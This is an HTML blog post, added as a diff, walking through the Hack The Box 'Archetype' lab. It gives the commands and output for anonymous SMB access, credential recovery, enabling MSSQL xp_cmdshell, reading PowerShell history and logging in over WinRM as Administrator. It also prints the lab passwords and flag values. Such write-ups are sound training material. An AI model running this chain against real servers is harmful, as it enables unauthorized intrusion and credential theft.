@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>HTB Archetype &mdash; purplepyram1d</title>
+<meta name="description" content="1 Initial Recon # Assign the given IP address to a variable boxip=&quot;10.129.x.x&quot; nmap -sV -sC &quot;$boxip&quot; 2 Nmap Output Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 19:11 -0400">
+<meta name="author" content="Johnny Meintel">
+<link rel="icon" href="../../assets/images/logo-pyramid.png">
+<link rel="stylesheet" href="../../assets/css/site.css">
+
+<link rel="canonical" href="https://johnnymeintel.com/blog/posts/htb-archetype.html">
+
+<meta property="og:title" content="HTB Archetype">
+<meta property="og:description" content="1 Initial Recon # Assign the given IP address to a variable boxip=&quot;10.129.x.x&quot; nmap -sV -sC &quot;$boxip&quot; 2 Nmap Output Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 19:11 -0400">
+<meta property="og:type" content="article">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<div class="wrap">
+
+  <header class="masthead compact">
+    <div class="mast-row">
+      <div>
+        <a href="../../index.html"><h1 class="title sm">purplepyram<span class="dim">1</span>d</h1></a>
+      </div>
+      <nav class="mast-nav" aria-label="Primary">
+        <a href="../../index.html">Contents</a>
+        <a href="../index.html">Writing</a>
+        <a href="../../rooted.html">Log</a>
+        <a href="https://github.com/purplepyram1d">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main" style="margin-top:2.5rem;">
+  <div class="grid">
+
+    <div class="rail">
+      <span>2026-04-22</span>
+      <span class="em">MSSQL</span>
+      <span>~7 min</span>
+    </div>
+
+    <article>
+      <h1>HTB Archetype</h1>
+      <div class="art-meta">Johnny Meintel &middot; 2026-04-22</div>
+
+      <h2><span class="n">1</span>Initial Recon</h2>
+      <pre># Assign the given IP address to a variable
+boxip="10.129.x.x"
+nmap -sV -sC "$boxip"</pre>
+      <h2><span class="n">2</span>Nmap Output</h2>
+      <pre>Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 19:11 -0400
+Nmap scan report for 10.129.95.187
+Host is up (0.073s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+|_ssl-date: 2026-04-19T23:10:40+00:00; -1m11s from scanner time.
+| ms-sql-ntlm-info:
+|   10.129.95.187:1433:
+|     Target_Name: ARCHETYPE
+|     NetBIOS_Domain_Name: ARCHETYPE
+|     NetBIOS_Computer_Name: ARCHETYPE
+|     DNS_Domain_Name: Archetype
+|     DNS_Computer_Name: Archetype
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-04-19T22:31:21
+|_Not valid after:  2056-04-19T22:31:21
+| ms-sql-info:
+|   10.129.95.187:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery:
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-04-19T16:10:31-07:00
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2026-04-19T23:10:33
+|_  start_date: N/A
+|_clock-skew: mean: 1h22m49s, deviation: 3h07m50s, median: -1m11s
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds</pre>
+      <h2><span class="n">3</span>Findings</h2>
+      <p>### Open Ports</p>
+      <pre>135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s
+5985/tcp open  http (WinRM)</pre>
+      <p>### Port 445 - SMB</p>
+      <p><strong>Shared drives</strong></p>
+      <ul>
+        <li>User workstation -&gt; SMB request -&gt; file server -&gt; file returned</li>
+        <li>Example: <code>\\fileserver01\Engineering\network_diagram.vsdx</code></li>
+        <li>Low-privilege or anonymous access can expose sensitive files, including deployment scripts and config files with credentials.</li>
+      </ul>
+      <pre>$cred = New-Object System.Management.Automation.PSCredential("admin","Password123")</pre>
+      <p><a href="https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0">PSCredential Class</a> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.management.automation?view=powershellsdk-7.4.0">System.Management.Automation Namespace</a></p>
+      <p><strong>Software deployment</strong></p>
+      <ul>
+        <li>Many organizations store installers on SMB shares and deploy them through scripts or management tooling.</li>
+      </ul>
+      <pre>\\deploy01\Software\
+    Chrome\
+        chrome_installer.msi
+    Office\
+        office365.msi
+    Security\
+        antivirus_agent.exe</pre>
+      <pre>msiexec /i "\\deploy01\Software\VPN\vpnclient.msi" /quiet /qn /norestart</pre>
+      <p><strong>Backup storage</strong></p>
+      <ul>
+        <li>Backups are often generated locally and then written to a remote SMB share.</li>
+        <li>Misplaced backup configs may expose database credentials.</li>
+      </ul>
+      <pre>Server=SQL01
+Database=ProductionDB
+User ID=sql_svc
+Password=Winter2025!</pre>
+      <p><strong>Group Policy distribution</strong></p>
+      <ul>
+        <li>Active Directory distributes policy-related files over SMB through <code>SYSVOL</code>.</li>
+      </ul>
+      <pre>\\corp.local\SYSVOL\
+    corp.local\
+        Policies\
+            {GUID}\
+                Machine\
+                User\
+        Scripts\
+            login.bat
+            startup.ps1</pre>
+      <p>### Port 1433 - MSSQL</p>
+      <ul>
+        <li>Default service port for Microsoft SQL Server.</li>
+        <li>Valuable not only for database access, but also because SQL Server can become a pivot into the host OS.</li>
+        <li>Supports SQL authentication and Windows-integrated authentication.</li>
+      </ul>
+      <pre>-- Run a Windows command through the SQL Server service context
+xp_cmdshell 'whoami'</pre>
+      <p>### Port 5985 - WinRM</p>
+      <ul>
+        <li>Default HTTP port for Windows Remote Management.</li>
+        <li>Provides remote command execution without a GUI session.</li>
+        <li>Becomes useful once valid credentials are obtained.</li>
+        <li>HTTPS equivalent: <code>5986</code></li>
+      </ul>
+      <p>### Additional Findings</p>
+      <p><strong>MSSQL out of date</strong></p>
+      <pre>Microsoft SQL Server 2017 RTM
+Post-SP patches applied: false</pre>
+      <p><strong>SMB signing not required</strong></p>
+      <pre>| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+
+| smb2-time:
+|   date: 2026-04-19T23:10:33
+|_  start_date: N/A
+|_clock-skew: mean: 1h22m49s, deviation: 3h07m50s, median: -1m11s
+
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)</pre>
+      <ul>
+        <li>Missing mandatory signing increases relay and tampering risk.</li>
+        <li>Time skew can affect authentication, log correlation, and incident reconstruction.</li>
+        <li>Guest/user-level access and challenge-response behavior make enumeration more valuable.</li>
+      </ul>
+      <p><strong>Note on <code>smb2-security-mode</code> vs. <code>smb-security-mode</code></strong></p>
+      <ul>
+        <li><code>smb2-security-mode</code> describes SMBv2/v3 negotiation behavior and what the server allows.</li>
+        <li><code>smb-security-mode</code> reflects session-level authentication details observed during interaction.</li>
+      </ul>
+      <p><strong>Q1 - Which TCP port is hosting a database server?</strong> <strong>Answer:</strong> <code>1433</code></p>
+      <h2><span class="n">4</span>Attack Path</h2>
+      <pre>SMB -&gt; credential discovery
+MSSQL -&gt; command execution
+WinRM -&gt; administrative login</pre>
+      <h2><span class="n">5</span>Objective 1 - Enumerate SMB Shares</h2>
+      <ul>
+        <li>[x] Enumerate available SMB shares without credentials</li>
+      </ul>
+      <pre>smbclient -L //&lt;TARGET_IP&gt; -N</pre>
+      <ul>
+        <li><code>-L</code> requests a share listing from the remote SMB server.</li>
+        <li><code>-N</code> attempts login without prompting for a password.</li>
+      </ul>
+      <pre>Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk
+C$              Disk      Default share
+IPC$            IPC       Remote IPC</pre>
+      <figure>
+        <img src="../../assets/images/htb-archetype/01.png" alt="Step 1 of the HTB Archetype walkthrough.">
+        <figcaption><span class="lab">Fig 1.</span></figcaption>
+      </figure>
+      <p><strong>Q2 - What is the name of the non-administrative share available over SMB?</strong> <strong>Answer:</strong> <code>backups</code></p>
+      <h2><span class="n">6</span>Objective 2 - Access the Share and Recover Credentials</h2>
+      <ul>
+        <li>[x] Access the SMB share and inspect its contents</li>
+      </ul>
+      <pre># Connect to the target share
+smbclient //&lt;TARGET_IP&gt;/backups -N
+
+# List contents
+smb: \&gt; ls
+
+# Download the file
+smb: \&gt; get prod.dtsConfig
+
+# Exit
+smb: \&gt; exit
+
+# View contents
+cat prod.dtsConfig</pre>
+      <figure>
+        <img src="../../assets/images/htb-archetype/02.png" alt="Step 2 of the HTB Archetype walkthrough.">
+        <figcaption><span class="lab">Fig 2.</span></figcaption>
+      </figure>
+      <pre>&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
+        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;</pre>
+      <p><strong>Q3 - What is the password identified in the file on the SMB share?</strong> <strong>Answer:</strong> <code>M3g4c0rp123</code></p>
+      <pre>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</pre>
+      <p><strong>Q4 - What Impacket script can be used to establish an authenticated connection to Microsoft SQL Server?</strong> <strong>Answer:</strong> <code>mssqlclient.py</code></p>
+      <ul>
+        <li>Impacket is a Python-based collection of tools and libraries for speaking native Microsoft protocols such as SMB, NTLM, Kerberos, MSRPC, and MSSQL.</li>
+      </ul>
+      <h2><span class="n">7</span>Objective 3 - Gain MSSQL Access</h2>
+      <ul>
+        <li>[x] Authenticate to SQL Server with the recovered service account credentials</li>
+      </ul>
+      <pre># Authenticate using the credentials recovered from the config file
+impacket-mssqlclient ARCHETYPE/sql_svc@&lt;TARGET_IP&gt; -windows-auth</pre>
+      <figure>
+        <img src="../../assets/images/htb-archetype/03.png" alt="Step 3 of the HTB Archetype walkthrough.">
+        <figcaption><span class="lab">Fig 3.</span></figcaption>
+      </figure>
+      <pre>-- Check version
+SELECT @@version;
+
+-- Attempt OS command execution
+EXEC xp_cmdshell 'whoami';</pre>
+      <p><strong>Q5 - What extended stored procedure of Microsoft SQL Server can be used to spawn a Windows command shell?</strong> <strong>Answer:</strong> <code>xp_cmdshell</code></p>
+      <h2><span class="n">8</span>Objective 4 - Enable <code>xp_cmdshell</code> and Execute OS Commands</h2>
+      <ul>
+        <li>[x] Enable <code>xp_cmdshell</code> and verify OS command execution</li>
+      </ul>
+      <figure>
+        <img src="../../assets/images/htb-archetype/04.png" alt="Step 4 of the HTB Archetype walkthrough.">
+        <figcaption><span class="lab">Fig 4.</span></figcaption>
+      </figure>
+      <pre>-- Enable advanced configuration options
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+-- Enable xp_cmdshell
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+-- Verify execution context
+EXEC xp_cmdshell 'whoami';</pre>
+      <figure>
+        <img src="../../assets/images/htb-archetype/05.png" alt="Step 5 of the HTB Archetype walkthrough.">
+        <figcaption><span class="lab">Fig 5.</span></figcaption>
+      </figure>
+      <pre>-- Review privileges for the SQL Server service context
+EXEC xp_cmdshell 'whoami /priv';</pre>
+      <pre>SeAssignPrimaryTokenPrivilege   Replace a process level token         Disabled
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process    Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking              Enabled
+SeImpersonatePrivilege          Impersonate a client after auth       Enabled
+SeCreateGlobalPrivilege         Create global objects                 Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set        Disabled</pre>
+      <pre>-- Inspect local filesystem access
+EXEC xp_cmdshell 'dir C:\Users';</pre>
+      <pre>output
+----------------------------------------------------
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users
+
+01/19/2020  04:10 PM    &lt;DIR&gt;          .
+01/19/2020  04:10 PM    &lt;DIR&gt;          ..
+01/19/2020  11:39 PM    &lt;DIR&gt;          Administrator
+01/19/2020  11:39 PM    &lt;DIR&gt;          Public
+01/20/2020  06:01 AM    &lt;DIR&gt;          sql_svc
+               0 File(s)              0 bytes
+               5 Dir(s)  10,714,005,504 bytes free</pre>
+      <p>### Escalation Indicators</p>
+      <ul>
+        <li><strong>SeImpersonatePrivilege</strong> is enabled and is commonly exploitable with tools such as JuicyPotato, RoguePotato, PrintSpoofer, or GodPotato.</li>
+        <li>Before using an exploit path, inspect local artifacts for simpler credential exposure.</li>
+      </ul>
+      <pre>EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
+EXEC xp_cmdshell 'dir C:\Users\Administrator\Desktop';
+EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';</pre>
+      <pre>SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
+output
+--------------------------------------------------
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+NULL
+ Directory of C:\Users\sql_svc\Desktop
+NULL
+01/20/2020  06:42 AM    &lt;DIR&gt;          .
+01/20/2020  06:42 AM    &lt;DIR&gt;          ..
+02/25/2020  07:37 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,722,607,104 bytes free
+NULL
+
+SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'dir C:\Users\Administrator\Desktop';
+output
+------------------------------------
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+NULL
+ Directory of C:\Users\Administrator
+NULL
+File Not Found
+NULL
+
+SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
+output
+-----------------------------------------------------------------------
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+NULL</pre>
+      <p><strong>Key takeaways</strong></p>
+      <ul>
+        <li><code>sql_svc</code> PowerShell history exposes administrator credentials.</li>
+        <li><code>user.txt</code> is accessible from the <code>sql_svc</code> desktop.</li>
+        <li>The <code>Administrator</code> profile is visible, but the desktop contents are not directly readable from the current context.</li>
+      </ul>
+      <p>### Updated Attack Path</p>
+      <pre>SMB -&gt; credential file -&gt; MSSQL access -&gt; xp_cmdshell -&gt; PowerShell history -&gt; Administrator credential -&gt; WinRM</pre>
+      <p><strong>Q6 - What script can be used to search for possible Windows privilege escalation paths?</strong> <strong>Answer:</strong> <code>winPEAS</code></p>
+      <p><strong>Q7 - What file contains the administrator's password?</strong> <strong>Answer:</strong> <code>ConsoleHost_history.txt</code></p>
+      <h2><span class="n">9</span>Flags and Final Access</h2>
+      <p>First, retrieve the user flag:</p>
+      <pre>EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';</pre>
+      <p><strong>Flag 1:</strong> <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
+      <p>From the Nmap output, WinRM on port <code>5985</code> is already confirmed open, so the recovered administrator credentials can be used for remote access.</p>
+      <pre>evil-winrm -i 10.129.95.187 -u Administrator -p 'MEGACORP_4dm1n!!'
+
+# Once authenticated
+whoami
+dir C:\Users\Administrator\Desktop
+type C:\Users\Administrator\Desktop\root.txt</pre>
+      <p><strong>Flag 2:</strong> <code>b91ccec3305e98240082d4474b848528</code></p>
+      <figure>
+        <img src="../../assets/images/htb-archetype/06.png" alt="Step 6 of the HTB Archetype walkthrough.">
+        <figcaption><span class="lab">Fig 6.</span></figcaption>
+      </figure>
+      <h2><span class="n">10</span>Summary</h2>
+      <p>Archetype is a straightforward Windows attack path built around exposed SMB data and poor credential hygiene. Anonymous SMB access reveals a backup configuration file with SQL service credentials, MSSQL access enables <code>xp_cmdshell</code>, and PowerShell history leaks the local administrator password, which is then used over WinRM to retrieve the final flag.</p>
+      <h2><span class="n">11</span>Additional Learning Resources</h2>
+      <p>### Tools Used</p>
+      <ul>
+        <li><strong><code>nmap</code></strong>: Service and version detection during initial recon.</li>
+        <li><strong><code>smbclient</code></strong>: Anonymous SMB share enumeration and file retrieval.</li>
+        <li><strong><code>impacket-mssqlclient</code></strong>: Authenticated access to Microsoft SQL Server using the recovered service credentials.</li>
+        <li><strong><code>xp_cmdshell</code></strong>: SQL Server stored procedure used to execute operating system commands through the SQL Server service context.</li>
+        <li><strong><code>evil-winrm</code></strong>: Remote shell access over WinRM once administrator credentials were recovered.</li>
+        <li><strong><code>winPEAS</code></strong>: Windows privilege escalation enumeration tool useful for surfacing token privileges, writable paths, stored credentials, and misconfigurations.</li>
+      </ul>
+      <p>### Useful Command Switches</p>
+      <ul>
+        <li><strong><code>nmap -sV -sC</code></strong></li>
+      </ul>
+      <p>- <code>-sV</code> probes services to identify versions. - <code>-sC</code> runs the default NSE script set, which was especially useful here for SMB and MSSQL details.</p>
+      <ul>
+        <li><strong><code>smbclient -L //&lt;TARGET_IP&gt; -N</code></strong></li>
+      </ul>
+      <p>- <code>-L</code> lists available shares on the target. - <code>-N</code> attempts a null session without prompting for a password.</p>
+      <ul>
+        <li><strong><code>impacket-mssqlclient ARCHETYPE/sql_svc@&lt;TARGET_IP&gt; -windows-auth</code></strong></li>
+      </ul>
+      <p>- <code>-windows-auth</code> uses Windows-integrated authentication instead of SQL-local authentication.</p>
+      <ul>
+        <li><strong><code>whoami /priv</code></strong></li>
+      </ul>
+      <p>- Shows the current token privileges and helps identify escalation opportunities such as <code>SeImpersonatePrivilege</code>.</p>
+      <ul>
+        <li><strong><code>evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -p '&lt;PASSWORD&gt;'</code></strong></li>
+      </ul>
+      <p>- <code>-i</code> sets the remote host. - <code>-u</code> supplies the username. - <code>-p</code> supplies the password.</p>
+      <p>### Suggested References</p>
+      <ul>
+        <li><a href="https://nmap.org/book/man.html">Nmap Reference Guide</a></li>
+        <li><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient Manual Page</a></li>
+        <li><a href="https://github.com/fortra/impacket">Impacket GitHub Repository</a></li>
+        <li><a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql">Microsoft documentation for <code>xp_cmdshell</code></a></li>
+        <li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM GitHub Repository</a></li>
+        <li><a href="https://github.com/peass-ng/PEASS-ng">winPEAS / PEASS-ng GitHub Repository</a></li>
+      </ul>
+
+      <hr>
+
+      <p class="kicker" style="font-family:var(--mono);font-size:.75rem;color:var(--ink-3);">
+        Rules and reproduction steps:
+        <a href="https://github.com/purplepyram1d/rmm-multiplicity" style="border-bottom:1px solid var(--rule);">github.com/purplepyram1d/rmm-multiplicity</a>
+      </p>
+    </article>
+  </div>
+  </main>
+
+  <footer>
+    <div class="grid">
+      <div class="rail"><span>about</span></div>
+      <div class="colophon">
+        <p class="fine">
+          <a href="https://github.com/purplepyram1d">github</a> &middot;
+          <a href="https://www.linkedin.com/in/johnnymeintel">linkedin</a><br>
+          <a href="../../index.html">&larr; contents</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
